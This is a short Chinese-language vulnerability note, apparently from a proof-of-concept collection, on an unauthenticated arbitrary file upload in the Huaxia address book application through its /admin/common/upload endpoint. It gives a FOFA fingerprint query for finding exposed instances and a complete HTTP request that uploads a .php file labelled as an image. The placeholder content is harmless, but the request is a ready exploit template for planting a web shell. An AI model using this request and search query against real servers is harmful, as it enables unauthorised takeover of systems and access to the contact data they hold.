# 华夏通讯录存在前台upload任意文件上传

华夏通讯录存在前台由于在鉴权方面存在疏漏，导致了可未授权访问，从而通过/admin/common/upload接口进行任意文件上传。

## fofa

```javascript
icon_hash="1403225079" && ":) APPV1"
```

## poc

```javascript
POST /admin/common/upload HTTP/2
Host: 127.0.0.1
Content-Type: multipart/form-data; boundary=---------------------------289666258334735365651210512949
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Length: 218

-----------------------------289666258334735365651210512949
Content-Disposition: form-data; name="file"; filename="1.php"
Content-Type: image/png

1111
-----------------------------289666258334735365651210512949--
```
路径返回包中
![image](https://github.com/user-attachments/assets/96615f38-3cf9-44d9-ba76-85fae0f45b31)

